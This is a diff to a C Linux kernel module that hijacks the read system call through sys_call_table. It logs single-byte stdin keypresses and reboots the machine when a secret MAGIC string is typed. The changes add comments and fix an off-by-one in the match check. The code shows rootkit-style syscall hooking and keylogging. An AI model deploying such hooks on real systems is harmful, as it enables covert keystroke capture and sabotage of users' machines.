@@ -34,15 +34,20 @@
 
 void **sys_call_table;
 asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
-int pos;
+int pos;    /* Size of MAGIC matched so far */
 
+/* Function that replaces the original read_syscall. In addition to what
+   read_syscall does, it also prints keypresses and reboots when the MAGIC
+   command is encountered */
 asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
 	int i;
 
+	/* Call original read_syscall */
 	ret = read_syscall_ref(fd, buf, count);
 
+	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
 	if (count != 1 || fd != 0)
 		return ret;
 
@@ -57,7 +62,9 @@ asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t co
 	}
 
 	pos++;
-	if (SIZEOF_MAGIC-1 < pos) {
+
+	/* MAGIC was typed, reboot */
+	if (SIZEOF_MAGIC <= pos) {
 		printk(KERN_INFO "Mouaxaxaxaxaxa!");
 		kernel_restart(NULL);
 	}
@@ -119,7 +126,6 @@ static void __exit interceptor_end(void)
 
 	return;
 }
-
 
 module_init(interceptor_start);
 module_exit(interceptor_end);
